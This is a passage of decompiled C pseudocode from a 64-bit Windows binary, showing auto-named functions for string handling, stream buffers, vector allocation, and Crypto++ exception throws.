  return sub_140028950(a1 - *(signed int *)(a1 - 4) - 176, a2);
}

//----- (0000000140028950) ----------------------------------------------------
__int64 __fastcall sub_140028950(__int64 a1, unsigned int a2)
{
  signed __int64 v2; // rdi
  unsigned int v3; // er14
  _QWORD *v4; // rax
  __int64 v5; // rbp
  _QWORD *v6; // rsi
  __int64 v7; // rax
  unsigned int v8; // ebx
  __int64 v9; // rax

  v2 = a1 - 32;
  v3 = a2;
  v4 = (_QWORD *)(*(__int64 (__fastcall **)(__int64))(*(_QWORD *)(a1 - 32) + 56i64))(a1 - 32);
  v5 = *v4;
  v6 = v4;
  v7 = (*(__int64 (__fastcall **)(signed __int64))(*(_QWORD *)v2 + 64i64))(v2);
  v8 = sub_140045340(v7);
  v9 = (*(__int64 (__fastcall **)(signed __int64))(*(_QWORD *)v2 + 40i64))(v2);
  return (*(__int64 (__fastcall **)(_QWORD *, __int64, _QWORD, _QWORD))(v5 + 24))(v6, v9, v8, v3);
}

//----- (00000001400289D0) ----------------------------------------------------
__int64 __fastcall sub_1400289D0(__int64 a1)
{
  __int64 v1; // rax
  __int64 v2; // rax

  v1 = (*(__int64 (**)(void))(*(_QWORD *)a1 + 120i64))();
  v2 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v1 + 64i64))(v1);
  return sub_1400453C0(v2);
}

//----- (00000001400289F0) ----------------------------------------------------
__int64 __fastcall sub_1400289F0(__int64 a1)
{
  __int64 v1; // rax
  __int64 v2; // rdx

  v1 = (*(__int64 (**)(void))(*(_QWORD *)a1 + 120i64))();
  LOBYTE(v2) = 1;
  return (*(__int64 (__fastcall **)(__int64, __int64))(*(_QWORD *)v1 + 96i64))(v1, v2);
}

//----- (0000000140028A10) ----------------------------------------------------
char __fastcall sub_140028A10(__int64 a1, _BYTE *a2, _BYTE *a3)
{
  _BYTE *v3; // rax
  _BYTE *v4; // rbx
  __int64 v5; // r14
  size_t v6; // r8
  void **v7; // rsi
  size_t v8; // r8
  _QWORD *v9; // rsi
  size_t v10; // r8
  _QWORD *v11; // rax
  __int64 v12; // rsi
  volatile signed __int32 *v13; // rbx
  char v15; // [rsp+30h] [rbp-89h]
  __int128 v16; // [rsp+38h] [rbp-81h]
  __int128 v17; // [rsp+48h] [rbp-71h]
  __int64 v18; // [rsp+58h] [rbp-61h]
  void *v19; // [rsp+60h] [rbp-59h]
  __int64 v20; // [rsp+70h] [rbp-49h]
  unsigned __int64 v21; // [rsp+78h] [rbp-41h]
  void *v22; // [rsp+80h] [rbp-39h]
  __int64 v23; // [rsp+90h] [rbp-29h]
  unsigned __int64 v24; // [rsp+98h] [rbp-21h]
  void *Dst; // [rsp+A0h] [rbp-19h]
  __int64 v26; // [rsp+B0h] [rbp-9h]
  unsigned __int64 v27; // [rsp+B8h] [rbp-1h]
  void *v28; // [rsp+C0h] [rbp+7h]
  __int64 v29; // [rsp+D0h] [rbp+17h]
  unsigned __int64 v30; // [rsp+D8h] [rbp+1Fh]

  v18 = -2i64;
  v3 = a3;
  v4 = a2;
  v5 = a1;
  v15 = 0;
  if ( !a2 || !a3 || !*(_QWORD *)(a1 + 8) )
    return 0;
  v21 = 15i64;
  v20 = 0i64;
  LOBYTE(v19) = 0;
  if ( *(_QWORD *)(a1 + 72) )
  {
    v27 = 15i64;
    v26 = 0i64;
    LOBYTE(Dst) = 0;
    if ( *a3 )
    {
      v6 = -1i64;
      do
        ++v6;
      while ( v3[v6] );
    }
    else
    {
      v6 = 0i64;
    }
    sub_140004F20(&Dst, v3, v6);
    v7 = (void **)(*(__int64 (__fastcall **)(_QWORD, void **, void **, __int64))(**(_QWORD **)(v5 + 72) + 8i64))(
                    *(_QWORD *)(v5 + 72),
                    &v28,
                    &Dst,
                    v5 + 96);
    if ( &v19 != v7 )
    {
      if ( v21 >= 0x10 )
        operator delete(v19);
      v21 = 15i64;
      v20 = 0i64;
      LOBYTE(v19) = 0;
      sub_140004720(&v19, v7);
    }
    if ( v30 >= 0x10 )
      operator delete(v28);
    v30 = 15i64;
    v29 = 0i64;
    LOBYTE(v28) = 0;
    if ( v27 >= 0x10 )
      operator delete(Dst);
  }
  else
  {
    if ( *a3 )
    {
      v8 = -1i64;
      do
        ++v8;
      while ( v3[v8] );
    }
    else
    {
      v8 = 0i64;
    }
    sub_140004F20(&v19, v3, v8);
  }
  v9 = operator new(0x60ui64);
  *(_QWORD *)&v16 = v9;
  if ( v9 )
  {
    v24 = 15i64;
    v23 = 0i64;
    LOBYTE(v22) = 0;
    if ( *v4 )
    {
      v10 = -1i64;
      do
        ++v10;
      while ( v4[v10] );
    }
    else
    {
      v10 = 0i64;
    }
    sub_140004F20(&v22, v4, v10);
    v15 = 1;
    v11 = sub_14002C520(v9, *(_QWORD *)(v5 + 8), &v22, &v19, 300i64);
  }
  else
  {
    v11 = 0i64;
  }
  _mm_storeu_si128((__m128i *)&v16, (__m128i)0i64);
  sub_140022CB0(&v16, (__int64)v11);
  v17 = v16;
  _mm_storeu_si128((__m128i *)&v16, (__m128i)0i64);
  v12 = (*(unsigned __int8 (__fastcall **)(__int64, __int128 *, _QWORD))(*(_QWORD *)(v5 + 144) + 24i64))(
          v5 + 144,
          &v17,
          0i64);
  v13 = (volatile signed __int32 *)*((_QWORD *)&v17 + 1);
  if ( *((_QWORD *)&v17 + 1) )
  {
    if ( !_InterlockedDecrement((volatile signed __int32 *)(*((_QWORD *)&v17 + 1) + 8i64)) )
    {
      (**(void (__fastcall ***)(volatile signed __int32 *))v13)(v13);
      if ( !_InterlockedDecrement(v13 + 3) )
        (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v13 + 8i64))(v13);
    }
  }
  if ( v15 & 1 )
  {
    if ( v24 >= 0x10 )
      operator delete(v22);
    v24 = 15i64;
    v23 = 0i64;
    LOBYTE(v22) = 0;
  }
  if ( v21 >= 0x10 )
    operator delete(v19);
  return v12;
}

//----- (0000000140028CC0) ----------------------------------------------------
__int64 __fastcall sub_140028CC0(__int64 a1, __int64 a2)
{
  __int64 v2; // rbx
  __int64 v3; // rax

  v2 = a2;
  v3 = (*(__int64 (**)(void))(**(_QWORD **)(a1 + 8) + 144i64))();
  return sub_14003C670(v2, v3);
}

//----- (0000000140028D74) ----------------------------------------------------
__int64 __fastcall sub_140028D74(__int64 a1)
{
  signed __int64 v1; // rcx

  v1 = a1 - *(signed int *)(a1 - 4) - 176;
  return (*(__int64 (__fastcall **)(signed __int64))(*(_QWORD *)(v1 - 40) + 24i64))(v1 - 40);
}

//----- (0000000140028D9C) ----------------------------------------------------
__int64 __fastcall sub_140028D9C(__int64 a1, __int64 a2)
{
  return sub_140028DB0(a1 - *(signed int *)(a1 - 4) - 176, a2);
}

//----- (0000000140028DB0) ----------------------------------------------------
__int64 __fastcall sub_140028DB0(__int64 a1, __int64 a2)
{
  signed __int64 v2; // rbx
  __int64 v3; // rbp
  _QWORD *v4; // rax
  __int64 v5; // rsi
  _QWORD *v6; // rdi
  __int64 v7; // rax

  v2 = a1 - 32;
  v3 = a2;
  v4 = (_QWORD *)(*(__int64 (__fastcall **)(__int64))(*(_QWORD *)(a1 - 32) + 48i64))(a1 - 32);
  v5 = *v4;
  v6 = v4;
  v7 = (*(__int64 (__fastcall **)(signed __int64))(*(_QWORD *)v2 + 40i64))(v2);
  return (*(__int64 (__fastcall **)(_QWORD *, __int64, __int64))(v5 + 40))(v6, v7, v3);
}

//----- (0000000140028E10) ----------------------------------------------------
__int64 __fastcall sub_140028E10(__int64 a1, __int64 a2)
{
  __int64 v2; // rbx

  v2 = a2;
  (*(void (__cdecl **)(_QWORD))(**(_QWORD **)(a1 + 8) + 152i64))(*(_QWORD *)(a1 + 8));
  return v2;
}

//----- (0000000140028E40) ----------------------------------------------------
__int64 __fastcall sub_140028E40(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3; // rbp
  __int64 v4; // rbx
  __int64 v5; // rsi
  _QWORD *v6; // rax
  _QWORD *v7; // rbx
  void (__fastcall ***v8)(_QWORD, signed __int64); // rcx
  __int64 v9; // rdi
  __int64 v10; // rax
  __int64 result; // rax

  v3 = a3;
  v4 = a2;
  v5 = a1;
  v6 = operator new(0xD0ui64);
  if ( v6 )
    v7 = sub_14003BA90(v6, v4);
  else
    v7 = 0i64;
  v8 = *(void (__fastcall ****)(_QWORD, signed __int64))(v5 + 80);
  if ( v8 )
    (**v8)(v8, 1i64);
  *(_QWORD *)(v5 + 80) = v7;
  v9 = *(_QWORD *)(v5 + 88);
  v10 = (*(__int64 (__cdecl **)(__int64))(*(_QWORD *)(v5 + 8) + 40i64))(v5 + 8);
  result = (*(__int64 (__fastcall **)(__int64, __int64, __int64))(v9 + 8))(v5 + 88, v10, v3);
  *(_DWORD *)(v5 + 24) = 0;
  return result;
}

//----- (0000000140028EE0) ----------------------------------------------------
__int64 __fastcall sub_140028EE0(__int64 a1, __int64 a2)
{
  __int64 v2; // rbp
  __int64 v3; // rsi
  _QWORD *v4; // rax
  __int64 v5; // rdi
  _QWORD *v6; // rbx
  __int64 v7; // rax

  v2 = a2;
  v3 = a1;
  v4 = (_QWORD *)(*(__int64 (**)(void))(*(_QWORD *)a1 + 56i64))();
  v5 = *v4;
  v6 = v4;
  v7 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v3 + 40i64))(v3);
  return (*(__int64 (__fastcall **)(_QWORD *, __int64, __int64))(v5 + 8))(v6, v7, v2);
}

//----- (0000000140028F40) ----------------------------------------------------
__int64 __fastcall sub_140028F40(__int64 a1, __int64 a2)
{
  __int64 v2; // rbx
  __int64 result; // rax

  v2 = a1;
  result = sub_14003C670(a1 + 32, a2);
  *(_DWORD *)(v2 + 24) = 0;
  return result;
}

//----- (0000000140028F70) ----------------------------------------------------
__int64 __fastcall sub_140028F70(__int64 a1)
{
  return (*(__int64 (**)(void))(**(_QWORD **)(a1 + 8) + 168i64))();
}

//----- (0000000140028F80) ----------------------------------------------------
__int64 __fastcall sub_140028F80(__int64 a1, __int64 a2)
{
  __int64 v2; // rdi
  __int64 v3; // rax
  __int64 v4; // rax
  __int64 v5; // rbx
  void *v6; // rdx
  void *v7; // rdx
  char v9; // [rsp+28h] [rbp-60h]
  __int64 v10; // [rsp+38h] [rbp-50h]
  void *Memory; // [rsp+40h] [rbp-48h]
  char v12; // [rsp+50h] [rbp-38h]
  __int64 v13; // [rsp+60h] [rbp-28h]
  void *v14; // [rsp+68h] [rbp-20h]

  v2 = a1;
  v3 = sub_140029020(a2, (__int64)&v12);
  v4 = sub_1400247D0((__int64)&v9, v3);
  v5 = sub_14003C670(v2 + 104, v4);
  v6 = Memory;
  memset(Memory, 0, 8 * v10);
  free(v6);
  v7 = v14;
  memset(v14, 0, 8 * v13);
  free(v7);
  return v5;
}

//----- (0000000140029020) ----------------------------------------------------
__int64 __fastcall sub_140029020(__int64 a1, __int64 a2)
{
  __int64 v2; // rbx

  v2 = a2;
  sub_14004C040(a1, a2);
  return v2;
}
// 14004C040: using guessed type __int64 __fastcall sub_14004C040(_QWORD, _QWORD);

//----- (0000000140029050) ----------------------------------------------------
_QWORD *__fastcall sub_140029050(_QWORD *a1)
{
  _QWORD *v1; // rbx
  _QWORD *v2; // rax
  void *v4; // [rsp+30h] [rbp-38h]
  unsigned __int64 v5; // [rsp+48h] [rbp-20h]

  v1 = a1;
  v2 = sub_1400290C0(&v4);
  sub_14000DAC0(v1, v2, &unk_1400A6C20);
  if ( v5 >= 0x10 )
    operator delete(v4);
  return v1;
}

//----- (00000001400290C0) ----------------------------------------------------
_QWORD *__fastcall sub_1400290C0(_QWORD *a1)
{
  _QWORD *v1; // rbx

  a1[3] = 15i64;
  a1[2] = 0i64;
  v1 = a1;
  *(_BYTE *)a1 = 0;
  sub_140004F20(a1, byte_1400A3400, 0i64);
  return v1;
}

//----- (0000000140029100) ----------------------------------------------------
void *__fastcall sub_140029100(__int64 a1, void *a2, __int64 a3)
{
  __int64 v3; // rbx
  void *v4; // rdi
  __int128 v6; // [rsp+30h] [rbp-D0h]
  __int64 v7; // [rsp+40h] [rbp-C0h]
  __int64 v8; // [rsp+50h] [rbp-B0h]
  int v9; // [rsp+5Ch] [rbp-A4h]
  signed int *v10; // [rsp+60h] [rbp-A0h]
  void *v11; // [rsp+70h] [rbp-90h]
  __int64 (__fastcall **v12)(void *); // [rsp+78h] [rbp-88h]
  char v13; // [rsp+80h] [rbp-80h]
  __int64 v14; // [rsp+E0h] [rbp-20h]
  int v15; // [rsp+E8h] [rbp-18h]
  void *v16; // [rsp+F8h] [rbp-8h]
  __int64 v17; // [rsp+170h] [rbp+70h]

  v8 = -2i64;
  v3 = a3;
  v4 = a2;
  v10 = (signed int *)&unk_1400A6BB0;
  v11 = &unk_1400A6BB8;
  v16 = std::basic_ios<char,std::char_traits<char>>::`vftable';
  std::basic_iostream<char,std::char_traits<char>>::basic_iostream<char,std::char_traits<char>>(&v10, &v12, 0i64);
  *(signed int **)((char *)&v10 + v10[1]) = (signed int *)&off_1400A6BA8;
  *(int *)((char *)&v9 + v10[1]) = v10[1] - 152;
  std::basic_streambuf<char,std::char_traits<char>>::basic_streambuf<char,std::char_traits<char>>(&v12);
  v12 = &off_1400A6430;
  v14 = 0i64;
  v15 = 0;
  sub_140022840(&v11, v3);
  LODWORD(v17) = 0;
  v6 = 0i64;
  v7 = v17;
  std::basic_istream<char,std::char_traits<char>>::seekg(&v10, &v6);
  sub_14003C210(v4);
  sub_14003C710(&v10, (__int64)v4);
  *(signed int **)((char *)&v10 + v10[1]) = (signed int *)&off_1400A6BA8;
  *(int *)((char *)&v9 + v10[1]) = v10[1] - 152;
  sub_140023CD0((__int64)&v12);
  std::basic_iostream<char,std::char_traits<char>>::~basic_iostream<char,std::char_traits<char>>(&v13);
  v16 = std::ios_base::`vftable';
  std::ios_base::_Ios_base_dtor((struct std::ios_base *)&v16);
  return v4;
}
// 140022840: using guessed type __int64 __fastcall sub_140022840(_QWORD, _QWORD);
// 1400A15C8: using guessed type __int64 __fastcall std::basic_iostream<char,std::char_traits<char>>::~basic_iostream<char,std::char_traits<char>>(_QWORD);
// 1400A15D0: using guessed type __int64 __fastcall std::basic_iostream<char,std::char_traits<char>>::basic_iostream<char,std::char_traits<char>>(_QWORD, _QWORD, _QWORD);
// 1400A15D8: using guessed type __int64 __fastcall std::basic_istream<char,std::char_traits<char>>::seekg(_QWORD, _QWORD);
// 1400A1638: using guessed type void *std::basic_ios<char,std::char_traits<char>>::`vftable';
// 1400A1640: using guessed type void *std::ios_base::`vftable';
// 1400A16B8: using guessed type __int64 __cdecl std::basic_streambuf<char,std::char_traits<char>>::basic_streambuf<char,std::char_traits<char>>(_QWORD);
// 1400A16C0: using guessed type void __stdcall static std::ios_base::_Ios_base_dtor(struct std::ios_base *);
// 1400A6430: using guessed type __int64 (__fastcall *off_1400A6430)(void *);
// 1400A6BA8: using guessed type __int64 (__fastcall *off_1400A6BA8)();

//----- (0000000140029280) ----------------------------------------------------
__int64 __fastcall sub_140029280(__int64 a1)
{
  return (*(__int64 (**)(void))(**(_QWORD **)(a1 + 8) + 144i64))();
}

//----- (0000000140029290) ----------------------------------------------------
char __fastcall sub_140029290(__int64 a1)
{
  __int64 v1; // rax

  v1 = *(signed int *)(a1 - 4);
  return sub_140028450();
}

//----- (00000001400292B0) ----------------------------------------------------
__int64 __fastcall sub_1400292B0(__int64 a1)
{
  __int64 result; // rax
  char v2; // [rsp+28h] [rbp-80h]
  __int64 v3; // [rsp+38h] [rbp-70h]
  __int64 v4; // [rsp+40h] [rbp-68h]
  __int64 (__fastcall **v5)(void *); // [rsp+50h] [rbp-58h]
  int v6; // [rsp+68h] [rbp-40h]
  char Dst; // [rsp+70h] [rbp-38h]
  __int64 v8; // [rsp+80h] [rbp-28h]
  __int64 v9; // [rsp+88h] [rbp-20h]

  result = (*(__int64 (__cdecl **)(__int64))(*(_QWORD *)a1 + 24i64))(a1);
  if ( !(_BYTE)result )
  {
    v4 = 15i64;
    v3 = 0i64;
    v2 = 0;
    sub_140004F20(&v2, byte_1400A3400, 0i64);
    std::exception::exception((std::exception *)&v5);
    v5 = &off_1400A8798;
    v6 = 4;
    v9 = 15i64;
    v8 = 0i64;
    Dst = 0;
    sub_140004DF0(&Dst, &v2, 0i64, 0xFFFFFFFFFFFFFFFFui64);
    v5 = &off_1400A8798;
    CxxThrowException(&v5, &_TI4_AVcls_094_cls_024_CryptoPP__);
  }
  return result;
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400A1930: using guessed type _QWORD std::exception::exception(std::exception *__hidden this);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);
// 1400D3BD8: using guessed type int _TI4_AVcls_094_cls_024_CryptoPP__;

//----- (00000001400293A0) ----------------------------------------------------
__int64 __fastcall sub_1400293A0(void *Src, __int64 a2, __int64 a3)
{
  __int64 v3; // rsi
  __int64 v4; // rdi
  _BYTE *v5; // rbx
  __int64 result; // rax
  size_t v7; // r8
  char Dst; // [rsp+28h] [rbp-A0h]
  __int64 v9; // [rsp+38h] [rbp-90h]
  __int64 v10; // [rsp+40h] [rbp-88h]
  char v11; // [rsp+50h] [rbp-78h]

  v3 = a3;
  v4 = a2;
  v5 = Src;
  result = type_info::operator!=(a2, a3);
  if ( (_BYTE)result )
  {
    v10 = 15i64;
    v7 = 0i64;
    v9 = 0i64;
    Dst = 0;
    if ( *v5 )
    {
      v7 = -1i64;
      do
        ++v7;
      while ( v5[v7] );
    }
    sub_140004F20(&Dst, v5, v7);
    sub_140023820((__int64)&v11, (__int64)&Dst, v4, v3);
    CxxThrowException(&v11, &_TI4_AVcls_010_cls_009_CryptoPP__);
  }
  return result;
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400A1920: using guessed type __int64 __fastcall type_info::operator!=(_QWORD, _QWORD);
// 1400D3A70: using guessed type int _TI4_AVcls_010_cls_009_CryptoPP__;

//----- (00000001400294B4) ----------------------------------------------------
char __fastcall sub_1400294B4(__int64 a1, __int64 a2, unsigned int a3)
{
  return sub_1400294D0(a1 - *(signed int *)(a1 - 4) - 176, a2, a3);
}

//----- (00000001400294D0) ----------------------------------------------------
char __fastcall sub_1400294D0(__int64 a1, __int64 a2, unsigned int a3)
{
  __int64 v3; // r14
  unsigned int v4; // ebp
  __int64 v5; // rbx
  __int64 (__fastcall ***v6)(_QWORD); // rax
  char result; // al
  __int64 v8; // rdi
  __int64 v9; // rbx
  __int64 v10; // rax
  int v11; // ebp

  v3 = a1;
  v4 = a3;
  v5 = a2;
  v6 = (__int64 (__fastcall ***)(_QWORD))(*(__int64 (__fastcall **)(__int64))(*(_QWORD *)(a1 - 32) + 48i64))(a1 - 32);
  result = (**v6)(v6);
  if ( result )
  {
    if ( *(_DWORD *)(v3 - 16) <= v4 )
    {
      if ( (*(unsigned __int8 (__fastcall **)(__int64, __int64, _QWORD))(*(_QWORD *)(v3 - 32) + 128i64))(
             v3 - 32,
             v5,
             v4)
        && (v8 = *(_QWORD *)(v3 - 32),
            v9 = (*(__int64 (__fastcall **)(__int64))(v8 + 48))(v3 - 32),
            v10 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)(v3 - 32) + 8i64))(v3 - 32),
            (*(unsigned __int8 (__fastcall **)(__int64, _QWORD, __int64, __int64))(v8 + 136))(v3 - 32, v4, v10, v9)) )
      {
        result = 1;
        v11 = v4 + 1;
      }
      else
      {
        result = 0;
        v11 = 0;
      }
      *(_DWORD *)(v3 - 16) = v11;
    }
    else
    {
      result = 1;
    }
  }
  return result;
}

//----- (0000000140029590) ----------------------------------------------------
char __fastcall sub_140029590(_QWORD *a1, unsigned __int64 a2)
{
  char result; // al
  _QWORD *v3; // rbx
  signed __int64 v4; // rdi
  char *v5; // rax

  result = 0;
  v3 = a1;
  *a1 = 0i64;
  a1[1] = 0i64;
  a1[2] = 0i64;
  if ( a2 )
  {
    if ( a2 > 0x666666666666666i64 )
    {
      std::_Xlength_error("vector<T> too long");
      __debugbreak();
    }
    v4 = 40 * a2;
    v5 = (char *)operator new(40 * a2);
    if ( !v5 )
    {
      std::_Xbad_alloc();
      JUMPOUT(*(_QWORD *)&byte_140029607);
    }
    *v3 = v5;
    v3[1] = v5;
    v3[2] = &v5[v4];
    result = 1;
  }
  return result;
}
// 140029607: using guessed type char;
// 1400A1770: using guessed type void __stdcall std::_Xlength_error(const char *);
// 1400A1778: using guessed type void std::_Xbad_alloc(void);

//----- (0000000140029610) ----------------------------------------------------
void __fastcall sub_140029610(__int64 a1)
{
  __int64 v1; // rbx

  v1 = *(_QWORD *)(a1 + 16);
  if ( v1 )
  {
    if ( *(_QWORD *)(v1 + 64) >= 0x10ui64 )
      operator delete(*(void **)(v1 + 40));
    *(_QWORD *)(v1 + 64) = 15i64;
    *(_QWORD *)(v1 + 56) = 0i64;
    *(_BYTE *)(v1 + 40) = 0;
    if ( *(_QWORD *)(v1 + 32) >= 0x10ui64 )
      operator delete(*(void **)(v1 + 8));
    *(_QWORD *)(v1 + 32) = 15i64;
    *(_QWORD *)(v1 + 24) = 0i64;
    *(_BYTE *)(v1 + 8) = 0;
    operator delete((void *)v1);
  }
}

//----- (0000000140029680) ----------------------------------------------------
signed __int64 __fastcall sub_140029680(__int64 a1, volatile signed __int32 **a2, volatile signed __int32 **a3)
{
  volatile signed __int32 **v3; // rsi
  volatile signed __int32 **v4; // rdi
  volatile signed __int32 *v5; // rbx
  signed __int64 result; // rax

  if ( a2 != a3 )
  {
    v3 = a3;
    v4 = a2 + 1;
    do
    {
      v5 = *v4;
      if ( *v4 && !_InterlockedDecrement(v5 + 2) )
      {
        (**(void (__fastcall ***)(volatile signed __int32 *))v5)(v5);
        if ( !_InterlockedDecrement(v5 + 3) )
          (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v5 + 8i64))(v5);
      }
      v4 += 2;
      result = (signed __int64)(v4 - 1);
    }
    while ( v4 - 1 != v3 );
  }
  return result;
}

//----- (00000001400296F0) ----------------------------------------------------
__int64 __fastcall sub_1400296F0(__int64 a1, __int64 (__fastcall ***a2)(_QWORD, _QWORD), __int64 (__fastcall ***a3)(_QWORD, _QWORD))
{
  __int64 (__fastcall ***v3)(_QWORD, _QWORD); // rdi
  __int64 (__fastcall ***v4)(_QWORD, _QWORD); // rbx
  __int64 result; // rax

  if ( a2 != a3 )
  {
    v3 = a3;
    v4 = a2;
    do
    {
      result = (**v4)(v4, 0i64);
      v4 += 5;
    }
    while ( v4 != v3 );
  }
  return result;
}

//----- (0000000140029730) ----------------------------------------------------
void __fastcall sub_140029730(__int64 a1, const void *a2, unsigned __int64 a3, int a4)
{
  size_t v4; // rsi
  const void *v5; // rbp
  __int64 v6; // rbx
  char *v7; // rax
  char *v8; // rdi
  bool v9; // zf
  int v10; // eax
  size_t v11; // rdx

  v4 = a3;
  v5 = a2;
  v6 = a1;
  *(_QWORD *)(a1 + 104) = 0i64;
  *(_DWORD *)(a1 + 112) = a4;
  if ( a3 && (a4 & 6) != 6 )
  {
    if ( a3 > 0xFFFFFFFFFFFFFFFFui64 || (v7 = (char *)operator new(a3), (v8 = v7) == 0i64) )
    {
      std::_Xbad_alloc();
      JUMPOUT(*(_QWORD *)&byte_140029829);
    }
    memcpy(v7, v5, v4);
    v9 = (*(_BYTE *)(v6 + 112) & 4) == 0;
    *(_QWORD *)(v6 + 104) = &v8[v4];
    if ( v9 )
    {
      **(_QWORD **)(v6 + 24) = v8;
      **(_QWORD **)(v6 + 56) = v8;
      **(_DWORD **)(v6 + 80) = v4;
    }
    v10 = *(_DWORD *)(v6 + 112);
    if ( !(v10 & 2) )
    {
      v11 = (size_t)v8;
      **(_QWORD **)(v6 + 32) = v8;
      if ( v10 & 0x18 )
        v11 = (size_t)&v8[v4];
      **(_QWORD **)(v6 + 64) = v11;
      **(_DWORD **)(v6 + 88) = v4 + (_DWORD)v8 - v11;
      if ( !**(_QWORD **)(v6 + 56) )
      {
        **(_QWORD **)(v6 + 24) = v8;
        **(_QWORD **)(v6 + 56) = 0i64;
        **(_DWORD **)(v6 + 80) = (_DWORD)v8;
      }
    }
    *(_DWORD *)(v6 + 112) |= 1u;
  }
}
// 140029829: using guessed type char;
// 1400A1778: using guessed type void std::_Xbad_alloc(void);

//----- (0000000140029830) ----------------------------------------------------
__int64 __fastcall sub_140029830(_QWORD *a1, __int64 a2, __int64 a3)
{
  volatile signed __int32 *v3; // rdi
  __int64 v4; // rsi
  __int64 v5; // rbp
  _QWORD *v6; // rbx
  __int64 result; // rax

  v3 = (volatile signed __int32 *)a1[1];
  v4 = a3;
  v5 = a2;
  v6 = a1;
  if ( v3 )
  {
    if ( _InterlockedDecrement(v3 + 2) )
    {
      a1[1] = a3;
      *a1 = a2;
    }
    else
    {
      result = (**(__int64 (__fastcall ***)(volatile signed __int32 *))v3)(v3);
      if ( !_InterlockedDecrement(v3 + 3) )
        result = (*(__int64 (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v3 + 8i64))(v3);
      v6[1] = v4;
      *v6 = v5;
    }
  }
  else
  {
    a1[1] = a3;
    *a1 = a2;
  }
  return result;
}

//----- (00000001400298B0) ----------------------------------------------------
void __fastcall sub_1400298B0(void ***a1)
{
  void ***v1; // rsi
  void **v2; // rbx
  void **v3; // rdi

  v1 = a1;
  v2 = (void **)**a1;
  **a1 = *a1;
  (*a1)[1] = *a1;
  a1[1] = 0i64;
  if ( v2 != *a1 )
  {
    do
    {
      v3 = (void **)*v2;
      if ( (unsigned __int64)v2[5] >= 0x10 )
        operator delete(v2[2]);
      v2[5] = (void *)15;
      v2[4] = 0i64;
      *((_BYTE *)v2 + 16) = 0;
      operator delete(v2);
      v2 = v3;
    }
    while ( v3 != *v1 );
  }
}

//----- (0000000140029930) ----------------------------------------------------
__int64 __fastcall sub_140029930(__int64 *a1)
{
  void (__fastcall ***v1)(_QWORD, _QWORD); // rsi
  void (__fastcall ***v2)(_QWORD, _QWORD); // rbx
  __int64 *v3; // rdi
  __int64 result; // rax

  v1 = (void (__fastcall ***)(_QWORD, _QWORD))a1[1];
  v2 = (void (__fastcall ***)(_QWORD, _QWORD))*a1;
  v3 = a1;
  if ( (void (__fastcall ***)(_QWORD, _QWORD))*a1 == v1 )
  {
    a1[1] = (__int64)v2;
  }
  else
  {
    do
    {
      (**v2)(v2, 0i64);
      v2 += 5;
    }
    while ( v2 != v1 );
    result = *v3;
    v3[1] = *v3;
  }
  return result;
}

//----- (0000000140029990) ----------------------------------------------------
signed __int64 __fastcall sub_140029990(__int64 a1, unsigned int a2)
{
  int v2; // eax
  unsigned int v3; // er14
  __int64 v4; // rbx
  unsigned __int64 *v6; // r9
  unsigned __int64 v7; // rdx
  unsigned __int64 v8; // r8
  int v9; // ecx
  unsigned __int64 v10; // rdx
  size_t v11; // rdi
  unsigned __int64 v12; // rcx
  unsigned __int64 v13; // rbp
  _BYTE *v14; // rsi
  const void **v15; // rax
  _BYTE *v16; // r15
  _QWORD *v17; // rax
  bool v18; // zf
  _QWORD *v19; // rax
  _QWORD *v20; // rcx
  __int64 v21; // rdx
  char *v22; // rdx
  __int64 v23; // r8
  __int64 v24; // rdx
  char *v25; // rdx

  v2 = *(_DWORD *)(a1 + 112);
  v3 = a2;
  v4 = a1;
  if ( v2 & 2 )
    return 0xFFFFFFFFi64;
  if ( a2 == -1 )
    return 0i64;
  if ( v2 & 8 )
  {
    v6 = *(unsigned __int64 **)(a1 + 64);
    v7 = *v6;
    if ( *v6 )
    {
      v8 = *(_QWORD *)(a1 + 104);
      if ( v7 < v8 )
      {
        v9 = **(_DWORD **)(a1 + 88);
        *v6 = v8;
        **(_DWORD **)(v4 + 88) = v7 + v9 - v8;
      }
    }
  }
  v10 = **(_QWORD **)(v4 + 64);
  if ( v10 && v10 < v10 + **(signed int **)(v4 + 88) )
  {
    *(_BYTE *)std::basic_streambuf<char,std::char_traits<char>>::_Pninc(v4) = v3;
    return v3;
  }
  if ( v10 )
    v11 = v10 + **(signed int **)(v4 + 88) - **(_QWORD **)(v4 + 24);
  else
    v11 = 0i64;
  v12 = v11 >> 1;
  if ( v11 >> 1 >= 0x20 )
  {
    if ( !v12 )
      return 0xFFFFFFFFi64;
  }
  else
  {
    v12 = 32i64;
  }
  do
  {
    if ( 0x7FFFFFFF - v12 >= v11 )
      break;
    v12 >>= 1;
  }
  while ( v12 );
  if ( !v12 )
    return 0xFFFFFFFFi64;
  v13 = v12 + v11;
  v14 = 0i64;
  if ( v12 + v11 )
  {
    if ( v13 > 0xFFFFFFFFFFFFFFFFui64 || (v14 = operator new(v12 + v11)) == 0i64 )
    {
      std::_Xbad_alloc();
      __debugbreak();
    }
  }
  v15 = *(const void ***)(v4 + 24);
  v16 = *v15;
  if ( v11 && (memcpy(v14, *v15, v11), v11) )
  {
    v20 = *(_QWORD **)(v4 + 32);
    *(_QWORD *)(v4 + 104) += v14 - v16;
    v21 = **(_QWORD **)(v4 + 64) - (_QWORD)v16;
    *v20 += v14 - v16;
    v22 = &v14[v21];
    **(_QWORD **)(v4 + 64) = v22;
    **(_DWORD **)(v4 + 88) = v13 + (_DWORD)v14 - (_DWORD)v22;
    if ( *(_BYTE *)(v4 + 112) & 4 )
    {
      **(_QWORD **)(v4 + 24) = v14;
      **(_QWORD **)(v4 + 56) = 0i64;
      **(_DWORD **)(v4 + 80) = (_DWORD)v14;
    }
    else
    {
      v23 = **(_QWORD **)(v4 + 64);
      v24 = **(_QWORD **)(v4 + 56);
      **(_QWORD **)(v4 + 24) = v14;
      v25 = &v14[v24 - (_QWORD)v16];
      **(_QWORD **)(v4 + 56) = v25;
      **(_DWORD **)(v4 + 80) = v23 - (_DWORD)v25 + 1;
    }
  }
